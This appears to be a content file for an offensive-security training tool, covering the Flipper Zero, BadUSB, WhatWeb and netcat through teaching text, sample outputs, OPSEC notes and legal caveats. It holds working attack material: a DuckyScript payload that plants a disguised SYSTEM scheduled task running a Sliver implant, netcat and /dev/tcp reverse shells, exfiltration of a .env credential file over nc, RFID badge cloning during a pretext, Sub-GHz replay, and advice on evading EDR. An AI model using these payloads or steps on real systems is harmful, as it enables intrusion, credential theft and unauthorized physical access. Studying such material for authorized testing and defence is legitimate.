STRING schtasks /create /tn "WindowsTelemetrySync" /tr "%TEMP%\s.exe" /sc onlogon /ru SYSTEM /f
ENTER
DELAY 500
STRING %TEMP%\s.exe
ENTER
sample_outputs.explanation: This payload uses certutil (a signed Microsoft binary, T1105 / T1140) to download and decode a base64-encoded Sliver implant, avoiding a raw PowerShell download cradle that would trigger AMSI and Defender's command-line entropy scoring. The scheduled task is named 'WindowsTelemetrySync' to blend with legitimate Microsoft telemetry tasks (T1053.005). Key operator observations: (1) certutil network requests appear in proxy logs as HTTP GETs from certutil.exe — a known LOLBin that some mature SOCs alert on specifically; consider switching to bitsadmin or msiexec for environments with certutil alerting. (2) The schtasks /ru SYSTEM flag requires the current user to have local admin rights — verify with `whoami /groups` first or the task creation will fail silently. (3) After beacon check-in, pivot to BloodHound ingestion (`SharpHound.exe -c All`) and check for Kerberoastable service accounts on the 'corp' domain. Follow-up tools: Sliver console (`use <session-id>`), SharpHound, Rubeus for Kerberoasting.

legal_notes: US CFAA (18 U.S.C. § 1030): Plugging a BadUSB device into any computer you do not own or have explicit written authorization to test constitutes unauthorized access to a protected computer. Unlike network-based attacks where authorization scope can be ambiguous, physical device insertion is an unambiguous physical act — there is no 'accidental' BadUSB. Prosecution risk is high because physical evidence (the device itself) is trivially preserved. Written rules of engagement must explicitly authorize physical access testing and name the specific locations and device types permitted.

Engagement scope for physical assessments must specify: (1) which physical locations are in scope (building, floor, room), (2) whether social engineering of employees to gain access is authorized, (3) whether devices may be left unattended (drop attacks) or only used with operator physically present, and (4) what happens if a device is confiscated by security staff — operators should carry a 'get out of jail' letter with an emergency contact at the client organization. A network-only scope document does NOT authorize BadUSB attacks even if the target machines are on the in-scope network.

Modern cloud and MDM consideration: In environments using Microsoft Intune or Jamf with USB device control policies, deploying a BadUSB payload may trigger an automated device quarantine or remote wipe of the target endpoint. Confirm with the client whether endpoint management policies are in scope for testing and whether triggering a remote wipe would constitute an unacceptable impact. This is especially critical in healthcare and financial environments where endpoint wipe events trigger mandatory incident reporting under HIPAA or PCI-DSS.
false_positives: KEYBOARD LAYOUT MISMATCH — the single most common payload failure: duckencoder encodes for a specific keyboard layout (default: US). If the target machine is configured for UK, French (AZERTY), German (QWERTZ), or any other layout, special characters will be typed incorrectly. A US-encoded '@' becomes '"' on a UK layout; a US-encoded 'z' becomes 'y' on a German layout. Payloads that appear to execute but produce garbled output or fail silently are almost always a layout mismatch. Always confirm the target's input locale before encoding, or use only alphanumeric characters and avoid symbols where possible.

TIMING FAILURES ON SLOW MACHINES: DELAY values that work on a fast SSD-equipped workstation will fail on older hardware or heavily loaded machines where the Run dialog or terminal takes longer to open. A DELAY 500 before typing into the Run dialog may fire before the dialog is ready, causing keystrokes to be swallowed by the desktop. This looks like 'the payload ran but nothing happened' — the operator sees no terminal open. Always add conservative DELAYs (1000-2000ms) for unknown target hardware, and test on representative hardware before a live engagement.

UAC PROMPT INTERRUPTION: If the payload attempts to run a command requiring elevation (e.g., installing a service, writing to C:\\Windows\\System32), a UAC dialog will appear mid-payload. The payload will continue typing into the UAC dialog rather than the terminal, causing the command to fail and potentially typing the payload text into a visible dialog box — a significant OpSec failure. Verify the target user's privilege level before deploying elevation-requiring payloads, or design payloads to operate entirely within user-level privilege.

SCREENSAVER / LOCK SCREEN: If the target machine locks between the time the operator inserts the device and the DELAY expires, all keystrokes will be typed into the lock screen credential field — potentially logging failed authentication attempts and alerting the user when they return to find their password field filled with payload text. For drop attacks (device left unattended), use the shortest reliable DELAY and consider whether the target environment's screen lock timeout makes the attack window viable.

ANTIVIRUS QUARANTINE OF STAGED PAYLOAD: The BadUSB device executes flawlessly and the download cradle runs, but the downloaded binary (Sliver implant, Meterpreter, etc.) is quarantined by Windows Defender or the installed EDR before it can execute. The operator sees the certutil download succeed (HTTP 200 in their server logs) but no beacon check-in. This is not a BadUSB failure — it is a payload detection failure. The BadUSB is a delivery mechanism only; the payload itself must independently evade endpoint defenses. Do not conflate a silent EDR kill of the implant with a BadUSB encoding or timing problem.

flipper.description: Portable multi-tool for hardware and wireless security research. Combines: Sub-GHz radio (315/433/868/915 MHz), NFC, RFID (125kHz), Bluetooth, Infrared, GPIO, BadUSB, and iButton in a pocket-sized device. Used for testing physical access controls, RF protocols, and wireless attack scenarios.
flipper.teach_intro: The Flipper Zero is a Swiss Army knife for physical and wireless security testing. It can read and replay key fobs, scan RFID access cards, capture and replay IR remote codes, emulate NFC cards, and act as a BadUSB device. It's a tool for understanding the RF and physical attack surface that digital-only security assessments miss.

Sub-GHz.label: Sub-GHz Radio
Sub-GHz.desc: Read, analyze, and replay Sub-GHz signals (car fobs, garage doors, weather stations, IoT).
Sub-GHz.example: Read mode: point at key fob and press Read → Save → Replay
Sub-GHz.teach: Most car key fobs and garage doors operate at 315MHz or 433MHz. Flipper captures the rolling code signal. Fixed-code remotes can be replayed directly. Rolling code (modern cars) requires more sophisticated attacks (RollJam).

NFC.label: NFC (13.56 MHz)
NFC.desc: Read, emulate, and write NFC cards including payment cards, building access cards.
NFC.teach: MIFARE Classic cards (used in many offices) have known crypto vulnerabilities and can be cloned. Modern high-security cards (DESFire EV2, SEOS) are resistant. Reading a card doesn't guarantee replay will work.

RFID.label: RFID (125kHz)
RFID.desc: Read and emulate low-frequency RFID cards (HID Prox, EM4100, Indala).
RFID.teach: 125kHz RFID is the legacy standard for building access. These cards have NO encryption — anyone with a reader (including a Flipper) can read and clone them. Trivially defeated with a read from 10cm away.

IR.label: Infrared
IR.desc: Capture and replay infrared remote signals. Universal remote + IR database.
IR.example: IR → Learn New Remote → point at TV → Learn
IR.teach: Flipper can learn any IR remote (TVs, ACs, projectors). The built-in IR database has universal codes for 1000+ devices. Physical pentest: walk into an office and turn off projectors during presentations.

BadUSB.label: BadUSB / HID Attack
BadUSB.desc: Execute DuckyScript payloads from SD card as a USB HID keyboard.
BadUSB.example: BadUSB → run_script.txt → plug into target PC
BadUSB.teach: Flipper Zero as BadUSB: plug into any USB port and it becomes a keyboard. Runs .txt DuckyScript files from SD card. Same capability as a USB Rubber Ducky but with all the other Flipper features too.

GPIO.label: GPIO / UART
GPIO.desc: General purpose I/O pins for hardware hacking, UART communication with embedded devices.
GPIO.example: GPIO → UART Terminal → connect to serial device
GPIO.teach: UART is how embedded devices talk to each other. Many IoT devices have an exposed UART debug port. Connect Flipper to it and you often get a root shell on the device — physical hardware hacking.

opsec_notes: Beginner noise: Every Sub-GHz transmission the Flipper Zero broadcasts is a real RF signal detectable by any SDR receiver or spectrum analyzer in the vicinity. A defender with a HackRF or RTL-SDR dongle running a wideband scan will see your carrier frequency, modulation type, and approximate location. Do not transmit in sensitive areas without understanding your RF footprint.

The Flipper Zero's BadUSB payloads execute as HID keystrokes — on a modern Windows 11 endpoint with CrowdStrike Falcon, the process tree spawned by a BadUSB payload (e.g., cmd.exe or powershell.exe parented to explorer.exe with no user interaction) is a high-confidence behavioral IOA. Falcon's 'Suspicious Process' detection fires on exactly this parent-child anomaly. Assume BadUSB payloads on hardened endpoints will alert within seconds.

Concrete defender artifact — BadUSB: Windows Security event log EID 4688 (process creation) will record the spawned process with command-line arguments. If Script Block Logging (EID 4104) and AMSI are enabled, every PowerShell command typed by the Flipper's HID payload is logged verbatim to Microsoft-Windows-PowerShell/Operational before execution. The payload is not 'invisible' just because it came from a USB device.

Cutting-edge 2025-2026 — NFC/RFID: Modern physical access control systems (Lenel S2, Genetec, CCURE 9000) increasingly log reader-side anomalies: cards presented outside business hours, cards presented at readers outside their assigned zone, and sequential multi-reader presentations within physically impossible timeframes. A cloned credential replayed at the wrong reader or wrong time will trigger a PACS alert even if the cryptographic clone is perfect.

Cutting-edge 2025-2026 — Sub-GHz replay: Rolling-code systems (KeeLoq, AUT64) are not vulnerable to naive replay, but the Flipper's Rolljam-style capture-and-suppress workflow (requiring a second RF device or modified firmware) leaves a detectable RF anomaly: the legitimate fob's signal is jammed and re-transmitted with a measurable delay. High-end automotive security research platforms and some modern garage door systems log signal timing anomalies. Confirm the target protocol before assuming replay will work.

Physical OpSec: The Flipper Zero is visually distinctive — a bright orange device with an animated dolphin screen. In a physical red-team engagement, operating it in a lobby, elevator, or parking garage will draw attention. Conceal it in a jacket pocket and use the directional antenna add-on only when necessary. The device's Bluetooth advertising beacon (if BT is enabled) is also passively detectable by any phone running a BLE scanner app.

sample_outputs.scenario: Beginner — parking lot physical assessment. Operator is testing whether employee key fobs use a static-code Sub-GHz protocol (common on older garage doors and gate openers). Single capture attempt on 433.92 MHz AM650 modulation.
sample_outputs.output:
[*] Sub-GHz RX started
[*] Frequency  : 433.920 MHz
[*] Modulation : AM650
[*] RSSI       : -61 dBm
[+] Signal detected at 00:00:04.221
[+] Protocol   : Princeton
[+] Key        : 0xA3F2C1
[+] Bits       : 24
[+] Repeat     : 3
[*] Saved to: /ext/subghz/capture_433_princeton_001.sub
[*] RX stopped after 10s
sample_outputs.explanation: The output tells you three critical things: (1) Protocol 'Princeton' is a static-code protocol — the same 24-bit key is transmitted every press, meaning a simple replay attack will work. (2) RSSI of -61 dBm means the fob was within roughly 5-10 meters — you were close enough for a clean capture. (3) The file is saved to the SD card for later replay. Next steps: (a) Use 'flipper_cli subghz tx --file /ext/subghz/capture_433_princeton_001.sub' to replay the captured signal at the target gate. (b) Document the protocol in your engagement report — Princeton-protocol systems should be replaced with rolling-code alternatives. (c) If the gate does NOT open on replay, the system may use a rolling code (KeeLoq, AUT64) — escalate to a Rolljam capture workflow or note it as a hardened control.

sample_outputs.scenario: Advanced — corporate physical red team. Operator has shoulder-surfed a target badging into a secured server room using a HID Prox card (125kHz RFID). Attempting to read and clone the card credential during a pretext interaction (e.g., holding a door, fake IT badge check).
sample_outputs.command: flipper_cli rfid read --protocol HID_H10301 --timeout 5 && flipper_cli rfid save --name corp_badge_jsmith && flipper_cli rfid emulate --name corp_badge_jsmith
sample_outputs.output:
[*] RFID Reader active (125kHz)
[*] Protocol filter: HID H10301
[+] Card detected!
[+] Protocol   : HID H10301 (26-bit Wiegand)
[+] Facility   : 42
[+] Card Number: 10871
[+] Raw Hex    : 0x2A002A77
[*] Saved to: /ext/rfid/corp_badge_jsmith.rfid
[*] Emulation started
[*] Transmitting HID H10301 — Facility 42, Card 10871
[*] Press BACK to stop emulation
sample_outputs.explanation: HID H10301 is 26-bit Wiegand — the most common legacy RFID format in North American corporate environments. The Facility Code (42) and Card Number (10871) are transmitted in plaintext with zero cryptographic protection. The Flipper reads and re-emulates this in under 10 seconds. Critical next steps for the kill chain: (1) Attempt badge access at the target reader immediately — PACS systems may flag the same credential used at two readers within a short window (anti-passback), so timing matters. (2) Cross-reference the facility code against the client's PACS database if you have IT access — facility code 42 may reveal the card issuance batch and help enumerate other valid card numbers in range. (3) Escalate findings: recommend migration to SEOS, OSDP with AES-128, or at minimum HID iCLASS SE — all of which resist this trivial clone attack. (4) If the door does not open, the reader may be configured for dual-factor (PIN + card) or the PACS may have anti-cloning detection — pivot to social engineering the PIN or review the PACS audit logs if you have internal access. Tools for follow-on: proxmark3 (deeper Wiegand analysis and iCLASS attacks), ChameleonMini (multi-card emulation for persistence testing), and the client's PACS admin console for audit log review.

legal_notes: US CFAA boundary: Transmitting RF signals to interact with access control systems, garage doors, or vehicle key systems without explicit written authorization from the property owner is a federal offense under 18 U.S.C. § 1030 and may additionally violate FCC Part 15 regulations governing intentional radiators. 'I was just testing' is not a defense. Your rules of engagement must explicitly authorize Sub-GHz transmission, RFID reading, and NFC emulation at named facilities before you power the device on near a target.

Scope and authorization: A signed statement of work authorizing 'physical penetration testing' does not automatically authorize RFID cloning, BadUSB deployment, or Sub-GHz replay. Each capability of the Flipper Zero should be explicitly listed in the engagement authorization document. Verbal authorization from a facilities manager is insufficient — get it in writing, with the specific building addresses, dates, and techniques authorized. Retain a copy on your person during the engagement.

BadUSB / HID legal boundary: Plugging a BadUSB device into a computer system without authorization constitutes unauthorized access under the CFAA regardless of whether the device 'looks like a USB drive.' Even on an authorized engagement, BadUSB payloads that exfiltrate data, establish persistence, or modify system configuration may trigger additional legal exposure if the scope document does not explicitly authorize those post-exploitation actions. Confirm with legal counsel before deploying BadUSB payloads that touch production systems.
false_positives: Rolling-code false read: The Flipper Zero's Sub-GHz analyzer will successfully capture and display the raw signal from a KeeLoq or AUT64 rolling-code fob, and the UI may show a 'Key' value. This does NOT mean the key is replayable. The displayed value is the encrypted rolling code for that single press — replaying it will fail because the receiver expects the next code in the sequence. Operators who see a captured key and assume replay will work are wrong; confirm the protocol is static-code (Princeton, CAME, Nice) before attempting replay.

HID card number ≠ access: Successfully reading and emulating an HID H10301 card does not guarantee the cloned credential will open a specific door. PACS systems enforce access schedules, zone restrictions, and anti-passback rules server-side. A perfectly cloned card belonging to a night-shift employee will be denied at a door their profile doesn't include, or during hours outside their schedule — and the denial will be logged with the cloned credential's ID.

NFC 'read' ≠ full clone: The Flipper Zero can read the UID of many NFC cards (MIFARE Classic, NTAG, DESFire) but a UID-only clone will only fool readers configured for UID-only authentication (a misconfiguration). Modern NFC access systems using DESFire EV2/EV3 with application-layer AES authentication will reject a UID-only emulation. The Flipper's NFC emulation capability is limited to specific card types and sectors — do not report 'NFC cloning successful' based solely on a UID read.

IR capture interference: The Flipper's IR receiver will capture any 38kHz IR signal in range — including ambient IR from fluorescent lighting, sunlight through windows, or other remotes in the room. A captured IR file that plays back garbage or triggers the wrong function may be a composite of multiple captured signals, not a clean single-remote capture. Always capture in a controlled environment with the target remote held directly at the Flipper's IR receiver.

BadUSB timing failures: BadUSB payloads assume a specific keyboard layout and OS response time. A payload written for US-QWERTY will produce wrong characters on a UK, French, or German keyboard layout. Additionally, payloads with hardcoded delays (e.g., 'wait 500ms for Run dialog') will fail on slow or heavily loaded endpoints where the OS takes longer to respond. Test payloads against a representative target OS and keyboard layout before deployment — a failed payload that types garbage into a visible window is a significant OpSec failure.

whatweb.description: Web fingerprinter — identifies CMS, frameworks, servers, JS libraries
whatweb.teach_intro: Web fingerprinter — identifies CMS, frameworks, servers, JS libraries

-a.label: -a
-a.teach: Aggression level 1-4 (3 = active fingerprinting, 4 = very aggressive)

-v.label: -v
-v.teach: Verbose output — shows all identified components

output_read.meaning: exact version — search WPScan database for vulns
known CVEs for that exact version
older PHP versions have many RCEs
older jQuery has XSS vulnerabilities
Country/IP info tells you CDN vs direct server

opsec_notes: BEGINNER — Every WhatWeb scan sends real HTTP GET requests to the target. The target's web server logs will record your source IP, User-Agent ('WhatWeb/0.5.5' by default), timestamp, and every URL path requested. This is the most obvious artifact you leave: a web access log entry with a non-browser UA string that any SOC analyst or SIEM rule will flag immediately.

CONCRETE ARTIFACT — Apache/Nginx access logs at /var/log/apache2/access.log or /var/log/nginx/access.log will contain lines like: '10.10.14.22 - - [14/May/2026:09:12:33 +0000] "GET / HTTP/1.1" 200 4523 "-" "WhatWeb/0.5.5"'. WAF products (Cloudflare, Imperva, AWS WAF) maintain their own request logs and will surface this UA string in dashboards within seconds of the request.

CUTTING-EDGE 2025-2026 — CrowdStrike Falcon's network telemetry (via the Falcon sensor's network filter driver) correlates process-to-socket events. If WhatWeb is spawned as a child of a suspicious parent (e.g., bash spawned from a web shell, or python3 spawning subprocess), the process tree anomaly scores high in Falcon's XDR graph. The command-line arguments including the target URL are captured in the process creation event and surfaced in Falcon Insight queries: 'event_simpleName=ProcessRollup2 AND FileName=whatweb'.

CUTTING-EDGE 2025-2026 — Modern cloud WAF/CDN stacks (Cloudflare Bot Management, Akamai Bot Manager, AWS WAF with managed rule groups) fingerprint HTTP request characteristics beyond the UA string: TLS JA3/JA3S fingerprint of the Ruby HTTP client WhatWeb uses, HTTP/1.1 header ordering, and absence of browser-typical headers (Accept-Language, Sec-Fetch-*). In 2025 deployments, a WhatWeb scan against a Cloudflare-protected target will be classified as 'automated tool' and may trigger a 403 or silent block before you see meaningful output — giving you a false-negative, not a detection event.

Use --proxy to route through Burp Suite or a SOCKS5 proxy chain, but be aware this only obscures your source IP — the User-Agent and HTTP fingerprint remain identical. To blend with browser traffic, combine --proxy with a custom UA string matching a current Chrome release (e.g., 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36') and slow the aggression level to -a 1 to reduce request volume and timing anomalies.

Aggression level -a 3 and -a 4 send additional probing requests beyond the initial GET (e.g., fetching /robots.txt, /sitemap.xml, error pages, and plugin-specific paths). Each additional request is another log line and another opportunity for a WAF rate-limit rule to trigger. On hardened targets, start at -a 1 (passive, single request) and escalate only after confirming the engagement's rules of engagement permit active probing.

sample_outputs.scenario: Beginner: Single target, default aggression, hunting for CMS and server version on a CTF box at 10.10.10.55
sample_outputs.output: http://10.10.10.55 [200 OK] Apache[2.4.51], Bootstrap[4.6.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.51 (Ubuntu)], IP[10.10.10.55], JQuery[3.5.1], MetaGenerator[WordPress 6.4.2], PHP[8.1.12], Script, Title[Hack The Planet — Just another WordPress site], WordPress[6.4.2], X-Powered-By[PHP/8.1.12]
sample_outputs.explanation:
WhatWeb made a single GET / request and parsed the HTTP response headers plus the HTML body. Here is what each token means:
- Apache[2.4.51] — the web server version, pulled from the 'Server:' response header
- WordPress[6.4.2] — detected via the meta generator tag '<meta name="generator" content="WordPress 6.4.2">'
- PHP[8.1.12] — pulled from the 'X-Powered-By: PHP/8.1.12' header
- JQuery[3.5.1] — detected from a script src path matching a known jQuery CDN or local path pattern

Next logical actions:
1. Run wpscan against this target to enumerate WordPress plugins, themes, and users: 'wpscan --url http://10.10.10.55 --enumerate p,t,u'
2. Check if PHP 8.1.12 or Apache 2.4.51 have known CVEs relevant to your engagement (search NVD or use 'searchsploit apache 2.4.51')
3. Note the WordPress version — 6.4.2 is a specific release; check wpscan's vulnerability database for unpatched plugin CVEs at that version

sample_outputs.scenario: Advanced: Input list of 50 subdomains discovered via cert transparency mining, verbose JSON logging, proxy through Burp, hunting for legacy framework exposure across an external attack surface
sample_outputs.output:
http://legacy-portal.corp-example.com [302 Found] HTTPServer[nginx/1.18.0], RedirectLocation[https://legacy-portal.corp-example.com/login]
https://legacy-portal.corp-example.com/login [200 OK] Cookies[JSESSIONID], Country[UNITED STATES][US], HTML5, HTTPServer[Apache-Coyote/1.1], IP[203.0.113.44], Java[1.8], Struts2, Title[Employee Portal — Login], X-Powered-By[Servlet/3.0 JSP/2.2]
http://api-dev.corp-example.com [200 OK] HTTPServer[Werkzeug/2.3.4 Python/3.9.18], IP[203.0.113.61], OpenAPI, Python[3.9.18], Title[API Dev — Swagger UI], UncommonHeaders[x-debug-token,x-debug-token-link]
http://old-cms.corp-example.com [200 OK] Drupal[7.98], HTTPServer[Apache/2.4.29 (Ubuntu)], IP[203.0.113.72], MetaGenerator[Drupal 7 (http://drupal.org)], PHP[7.4.33], Title[Intranet CMS]
http://monitoring.corp-example.com [401 Unauthorized] HTTPServer[nginx/1.24.0], WWW-Authenticate[Basic realm="Grafana"], IP[203.0.113.88]
sample_outputs.explanation:
This output surfaces four high-value findings across the external attack surface:

1. legacy-portal.corp-example.com — Apache-Coyote/1.1 is the embedded HTTP connector in old Tomcat releases. Combined with Struts2 detection and Java 1.8, this is a strong indicator of a legacy Java EE stack. Struts2 has a long history of critical RCE vulnerabilities (OGNL injection family). Next step: run nuclei with the struts2 template pack: 'nuclei -u https://legacy-portal.corp-example.com -t technologies/apache-struts2.yaml'

2. api-dev.corp-example.com — Werkzeug debug mode artifacts (x-debug-token, x-debug-token-link headers) suggest the Flask/Werkzeug debugger may be enabled. If the Werkzeug interactive debugger is exposed, it provides an in-browser Python REPL — unauthenticated RCE. Next step: GET /console and attempt to access the Werkzeug debugger PIN bypass (documented technique, search 'Werkzeug debugger PIN exploit'). Also note this is a dev subdomain — likely weaker auth controls.

3. old-cms.corp-example.com — Drupal 7 reached end-of-life in January 2025. PHP 7.4.33 is also EOL. This combination is a high-priority target. Next step: 'droopescan scan drupal -u http://old-cms.corp-example.com' to enumerate modules, then check for Drupalgeddon2-family vectors.

4. monitoring.corp-example.com — Grafana behind HTTP Basic Auth on nginx. Grafana has had authentication bypass CVEs (e.g., CVE-2021-43798 path traversal, and more recent issues). Next step: attempt default credentials (admin:admin, admin:grafana) and check the Grafana version via /api/health endpoint.

The --log-json output at ./whatweb_results.json can be parsed with jq for automated triage: 'jq '.[] | select(.plugins.Struts2 != null)' ./whatweb_results.json'

legal_notes: US CFAA (18 U.S.C. § 1030) — WhatWeb sends real HTTP requests to target systems. Even a single unauthenticated GET request to a system you do not own or have explicit written authorization to test constitutes 'unauthorized access' under the CFAA if the system is not publicly open for such probing. 'It's just a web request' is not a legal defense. Scope your target list to IP ranges and domains explicitly listed in your signed rules of engagement before running any scan.

Authorization scope — When using -i with a subdomain list, verify EVERY entry in the input file is within authorized scope before execution. Subdomain enumeration tools (amass, subfinder, dnsx) frequently return out-of-scope third-party SaaS hostnames (e.g., company.zendesk.com, company.atlassian.net) that resolve to infrastructure you have zero authorization to probe. Scanning those hosts violates your ROE and potentially the CFAA regardless of how the hostname was discovered.

Modern cloud consideration — Many corporate web properties sit behind CDN or WAF providers (Cloudflare, Akamai, Fastly). Scanning the CDN edge IP is not the same as scanning the origin server, and your requests may be logged by a third party (the CDN provider) who is not party to your engagement authorization. Some CDN providers' terms of service treat automated scanning as a ToS violation independent of your client's authorization. Confirm with your client whether CDN-fronted assets are in scope and whether the CDN provider has been notified.
false_positives: CDN and reverse-proxy masking — When a target sits behind Cloudflare, Akamai, or an AWS CloudFront distribution, WhatWeb will fingerprint the CDN edge node, not the origin server. You will see 'cloudflare' or 'AmazonS3' in the output instead of the actual backend stack (e.g., a Django app on nginx). The technology stack you report will be wrong. Always correlate with direct-to-origin requests (if origin IP is known) or passive DNS/cert data before drawing conclusions.

X-Powered-By header suppression — Many hardened deployments strip or spoof the X-Powered-By and Server headers (e.g., nginx configured with 'server_tokens off', PHP with 'expose_php = Off'). WhatWeb will report no PHP or server version even when both are present. A blank or generic 'Server: nginx' result does not mean the stack is unidentifiable — it means header-based detection failed. Fall back to content-based fingerprinting (generator meta tags, JS library paths, cookie names like PHPSESSID or JSESSIONID).

Version string staleness — WhatWeb's plugin signatures match version strings against regex patterns. A site that has updated its CMS but left old static assets cached (e.g., an old jQuery file still referenced in a template) will report the old library version. The reported jQuery[2.1.4] may be a dead asset never loaded by modern browsers, not the version actually in use. Verify version strings by inspecting the live page source and network requests in a browser.

WAF silent blocking producing false-negative fingerprints — A WAF configured to return a generic 200 OK with a decoy HTML page (honeypot response) instead of a 403 will cause WhatWeb to fingerprint the decoy page, not the real application. You may get confident-looking output (e.g., WordPress detected) when the real backend is something entirely different. Correlate WhatWeb output with Shodan/Censys historical data and manual browser inspection.

Redirect chains and HTTPS mismatches — When scanning HTTP targets that redirect to HTTPS, WhatWeb may fingerprint the redirect response (302 with minimal headers) rather than the final HTTPS destination, especially at lower aggression levels. The output will show only the redirect server headers and miss the full technology stack on the HTTPS endpoint. Always include both http:// and https:// variants in your target list, or use -a 3 to ensure WhatWeb follows redirects and fingerprints the final response.

netcat.description: TCP/UDP Swiss army knife — listeners, port checks, file transfer, pivoting
netcat.teach_intro: TCP/UDP Swiss army knife — listeners, port checks, file transfer, pivoting

-e.label: -e
-e.teach: Execute program on connect: -e /bin/bash (some nc versions)

output_read.meaning: ready for reverse shell
connection received — you have a shell
root
port closed

opsec_notes: BEGINNER NOISE: Every netcat connection attempt generates a full TCP handshake (SYN/SYN-ACK/ACK) visible in any network tap, firewall log, or SIEM with flow collection. On Windows, even a single 'nc -nv 10.0.0.1 445' will appear in Windows Firewall logs at C:\Windows\System32\LogFiles\Firewall\pfirewall.log with the destination IP, port, and timestamp.

PROCESS TREE ANOMALY (2025 EDR): CrowdStrike Falcon and SentinelOne both score netcat (and its variants ncat, nc.exe, nc64.exe) as high-risk when spawned from unusual parent processes. A reverse shell where the parent is cmd.exe or powershell.exe with a -e flag will trigger Falcon's 'Suspicious Process' behavioral indicator within seconds. The process tree 'cmd.exe -> nc.exe -e cmd.exe <attacker_ip> 4444' is a near-certain detection in any tuned EDR as of 2025.

COMMAND-LINE TELEMETRY (2025 EDR): Microsoft Defender for Endpoint ingests command-line arguments via ETW (Event Tracing for Windows) and Sysmon EID 1. The string '-e cmd' or '-e /bin/bash' in a netcat invocation is a high-confidence IOC in Defender's ML pipeline. On Linux, auditd with '-a always,exit -F arch=b64 -S execve' will capture the full argv array including the -e flag and the callback IP/port.

CONCRETE DEFENDER ARTIFACT: On Linux targets, a netcat listener 'nc -lvnp 4444' creates a socket visible in 'ss -tlnp' and 'netstat -antp' output, and is logged by auditd (EID SYSCALL for bind/listen). The process will appear in '/proc/<pid>/net/tcp' with the hex-encoded local address. Any HIDS (Wazuh, OSSEC) with socket monitoring enabled will alert on unexpected LISTEN states.

EVASION CONSIDERATION (2025): Modern blue teams hunt for netcat by binary hash and name. Renaming nc to 'svchost' or 'update' is insufficient — CrowdStrike Falcon uses behavioral ML on syscall sequences (socket->bind->listen->accept->dup2->execve) that match the reverse shell pattern regardless of binary name. Consider ncat with --ssl for traffic encryption, but note that the TLS handshake to a self-signed cert on a non-standard port is itself a detection signal in Zeek/Suricata with JA3 fingerprinting.

PIVOTING DETECTION: Using netcat as a relay/pivot (e.g., 'nc -lvnp 4444 | nc 10.10.10.5 22 | nc -lvnp 4445') creates bidirectional flows that appear as two simultaneous connections from the same process. NDR platforms (Darktrace, ExtraHop) flag this as 'unusual data relay' based on byte symmetry and connection timing. The relay process will show two open file descriptors pointing to different remote IPs, visible in 'lsof -p <pid>'.

sample_outputs.scenario: Beginner: checking if SSH port 22 is open on a single target host using zero-I/O scan mode (-z) with verbose output
sample_outputs.output: Connection to 10.10.10.5 22 port [tcp/*] succeeded!
sample_outputs.explanation: The '-z' flag tells netcat to connect and immediately disconnect without sending data — it is purely checking if the port accepts a TCP handshake. '-v' enables verbose output so you see the result. '-n' skips DNS resolution, which is faster and avoids leaving DNS query logs on the network. The 'succeeded!' message means the TCP three-way handshake completed: the target's port 22 is open and a service is listening. If the port were closed you would see 'Connection refused'. If filtered by a firewall, the command would hang until timeout. NEXT STEPS: (1) Banner-grab the SSH service with 'nc -nv 10.10.10.5 22' (without -z) to see the SSH version string the server sends on connect. (2) Feed confirmed open ports into nmap for service/version detection: 'nmap -sV -p 22 10.10.10.5'. (3) If SSH is exposed, attempt credential spray with hydra or check for known CVEs against the banner version.

sample_outputs.scenario: Advanced: establishing a reverse shell from a compromised Linux web server back to the attacker's C2 listener, then using the session for file exfiltration via netcat pipe — simulating post-exploitation on an internal host after initial access via web shell
sample_outputs.command:
# On attacker machine (listener):
nc -lvnp 4444

# On victim (executed via web shell or RCE):
nc -nv 192.168.45.200 4444 -e /bin/bash
sample_outputs.output:
listening on [any] 4444 ...
connect to [192.168.45.200] from (UNKNOWN) [10.10.10.22] 51337
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uname -a
Linux web01 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
cat /etc/passwd | head -5
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
ls /var/www/html/config/
db_config.php  app_settings.ini  .env
sample_outputs.explanation: The attacker runs a listener on port 4444 with '-l' (listen), '-v' (verbose), '-n' (no DNS), '-p 4444' (port). The victim executes netcat with '-e /bin/bash' which forks /bin/bash and pipes its stdin/stdout/stderr over the TCP connection — this is the classic 'bind shell via -e' pattern, here used as a reverse shell (victim connects out, bypassing inbound firewall rules). The session lands as www-data (the web server user). CRITICAL OBSERVATIONS: (1) The '.env' file in the web root is a high-value target — it commonly contains DATABASE_URL, API keys, and cloud credentials (AWS_ACCESS_KEY_ID). Exfiltrate with 'cat .env | nc 192.168.45.200 5555' while running 'nc -lvnp 5555 > loot.env' on the attacker side. (2) Upgrade this dumb shell immediately: 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"' then Ctrl-Z, 'stty raw -echo; fg'. (3) Pivot to internal network enumeration with nmap or masscan from this foothold. (4) Check for sudo rights ('sudo -l') and SUID binaries ('find / -perm -4000 2>/dev/null'). NOTE: '-e' is disabled in OpenBSD netcat (the default on many modern Debian/Ubuntu systems) — in that case use a bash redirect: 'bash -i >& /dev/tcp/192.168.45.200/4444 0>&1' or install ncat (nmap's netcat) which retains -e support.

legal_notes: US CFAA (18 U.S.C. § 1030): Using netcat to connect to any host you do not own or have explicit written authorization to test constitutes unauthorized access under the CFAA, regardless of whether you 'find anything'. The TCP handshake in '-z' scan mode is itself an access attempt. Penalties range from misdemeanor (first offense, no damage) to felony (repeat offense, damage, or intent to defraud). Written authorization must specify the IP ranges, ports, and time windows you are permitted to probe.

RULES OF ENGAGEMENT — SCOPE: Your engagement scope document must explicitly list every IP or CIDR range you are authorized to connect to. Netcat makes it trivially easy to pivot to out-of-scope hosts once inside a network. Before running any relay or pivot chain, verify the destination IP is in scope. Many engagements prohibit 'dual-homed' pivoting that crosses network segments not listed in the SOW. Violating scope — even accidentally — can void your legal protection and expose you to civil liability.

